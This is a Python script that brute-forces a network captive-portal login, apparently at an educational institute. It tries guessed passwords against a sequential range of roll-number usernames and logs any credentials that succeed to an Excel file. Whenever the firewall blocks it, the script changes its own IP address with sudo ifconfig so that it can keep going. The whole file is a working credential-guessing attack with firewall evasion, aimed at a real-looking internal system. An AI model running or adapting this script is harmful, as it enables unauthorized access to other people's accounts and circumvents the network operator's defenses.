import requests
import time
import sys
import subprocess
import socket
import struct
import pandas as pd

url = 'http://10.1.1.1:8090/login.xml'
pass_no = 543
pass_base = 'IIITV@icd#'
found = []

start_ip = struct.unpack('>I', socket.inet_aton('10.9.9.1'))[0]
end_ip = struct.unpack('>I', socket.inet_aton('10.9.9.255'))[0]
change_ip = start_ip

for i in range(202311001, 202311090):
    while True:
        try:
            pass_fuzz = pass_base + str(pass_no)
            body = {'mode': 191, 'username': i, 'password': pass_fuzz}
            r = requests.post(url, data=body, timeout=3)
            to_append = 'Username: ' + str(i) + ' Password: ' + pass_fuzz
            print("Trying user:", i, "pass:", pass_fuzz)
            if int(r.headers['Content-Length']) < 300:
                print('\x1b[6;30;42m' + 'Found Username: ' + str(i) + '  password: ' + pass_fuzz + '\x1b[0m')
                found.append(to_append)
            pass_no = pass_no + 1
            # time.sleep(1)
            break
        except (requests.exceptions.ConnectTimeout, requests.exceptions.ConnectionError):
            print('The request timed out')
            print('\x1b[6;30;41m' + 'Oops Firewall blocked!!' + '\x1b[0m' + "\nChanging IP....")
            while True:
                ip_address = socket.inet_ntoa(struct.pack('>I', change_ip))
                change_ip = change_ip + 1
                if ip_address == '10.0.0.0' or ip_address == '10.1.1.1':
                    continue
                try:
                    print(f"Trying IP address: {ip_address}")
                    subprocess.run(['sudo', 'ifconfig', 'wlan0', ip_address, 'netmask', '255.0.0.0'])
                    time.sleep(5)
                    response = subprocess.run(['ping', '-c', '1', '10.1.1.1'], stdout=subprocess.PIPE)
                    if response.returncode == 0:
                        print(f"Successfully set IP address to: {ip_address}")
                        break
                except subprocess.CalledProcessError:
                    pass

print("\nProgram Finished!!")
print("Found ", len(found), " credentials")
print('\n'.join(map(str, found)))
print("Saving to results.xlsx ....")
df = pd.DataFrame()
df['Found'] = found
df.to_excel('result.xlsx', index=False)

print("Resetting Network Connection ...")
subprocess.run(['sudo', 'dhclient', 'wlan0'])